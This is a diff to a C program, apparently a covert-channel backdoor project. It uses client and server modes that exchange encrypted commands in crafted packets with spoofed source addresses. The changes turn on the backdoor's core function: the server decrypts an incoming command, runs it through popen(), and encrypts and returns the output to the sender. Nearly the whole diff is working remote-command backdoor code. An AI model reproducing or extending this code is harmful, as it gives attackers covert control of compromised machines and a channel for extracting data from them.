@@ -90,18 +90,21 @@ int main(int argc, char **argv)
 
     if (backdoor == 0)
     {
+        fprintf(stdout, "Client..\n");
         int cypher_len = 0;
         unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
-
-        fprintf(stdout, "Client..\n");
-        cypher_len = forgepacket(ciphertext);
+        // char *buff = getInput();
+        cypher_len = forgepacket(ciphertext, getInput());
         client(source_host, dest_host, dest_port, ciphertext, cypher_len);
-        fprintf(stdout, "\nPackets Sent\n\n");
-    }
 
-    fprintf(stdout, "Backdoor..\n");
-    server(source_host, dest_host, dest_port);
-    fprintf(stdout, "\nData Received\n\n");
+        fprintf(stdout, "Backdoor..\n");
+        server(dest_host, source_host, dest_port);
+    }
+    else
+    {
+        fprintf(stdout, "Backdoor..\n");
+        server(source_host, dest_host, dest_port);
+    }
 
     return 0;
 }
@@ -124,21 +127,26 @@ int main(int argc, char **argv)
  * NOTES:
  * This section runs client or the server code if server flag was set
  * -----------------------------------------------------------------------*/
-int forgepacket(unsigned char *ciphertext)
+int forgepacket(unsigned char *ciphertext, char *buff)
 {
-    // GET COMMAND INPUT
-    char commandBuffer[BUFF_SIZE];
-    memset(&commandBuffer, 0, BUFF_SIZE);
+    // ENCRYPT DATA
+    int ciphertext_len = encrypt((unsigned char *)buff, BUFF_SIZE, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)ciphertext);
+    fprintf(stdout, "Normal Text:\n%s\n\n", buff);
+    fprintf(stdout, "Cypher Text:\n%d\n%s\n\n", ciphertext_len, ciphertext);
+
+    return ciphertext_len;
+}
+
+char *getInput()
+{
+    // // GET COMMAND INPUT
+    char *commandBuffer = (char *)malloc(BUFF_SIZE);
+    memset(commandBuffer, 0, BUFF_SIZE);
 
     fprintf(stdout, "\nEnter Command: ");
     fgets(commandBuffer, BUFF_SIZE, stdin);
 
-    // ENCRYPT DATA
-    int ciphertext_len = encrypt((unsigned char *)commandBuffer, BUFF_SIZE, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)ciphertext);
-    fprintf(stdout, "Normal Text:\n%s\n\n", commandBuffer);
-    fprintf(stdout, "Cypher Text:\n%d\n%s\n\n", ciphertext_len, ciphertext);
-
-    return ciphertext_len;
+    return commandBuffer;
 }
 
 /*--------------------------------------------------------------------------
@@ -262,13 +270,14 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
  * -----------------------------------------------------------------------*/
 void server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port)
 {
-    // FILE *fp;
+    FILE *fp;
     int recv_socket;
     struct recv_udp recv_packet;
     char *commandBuffer;
+    bool open = true;
+
     int temp = 0;
     int size = 0;
-    bool open = true;
     int pc = 0;
     int packet_count = 0;
 
@@ -317,17 +326,21 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 
                     fprintf(stdout, "Decypher: %d | %s\n", decryptedtext_len, decryptedtext);
 
-                    // Read
-                    // fp = popen(decryptedtext, "r");
-
                     // IF Exit command;
-                    open = false;
+                    // open = false;
 
-                    // Else Send
-                    int cypher_len = 0;
+                    // Else
+
+                    // Get Output
+                    char *output = (char *)malloc(OUTPUT_SIZE);
+                    fp = popen(decryptedtext, "r");
+                    fread(output, 1, OUTPUT_SIZE, fp);
+                    fprintf(stdout, "Return: %s \n", output);
+
+                    // CYpher and Send
                     unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
-                    cypher_len = forgepacket(ciphertext);
-                    client(source_addr, dest_addr, dest_port, ciphertext, cypher_len);
+                    int cypher_len = forgepacket(ciphertext, output);
+                    client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
 
                     // Reset Counters
                     packet_count = 0;
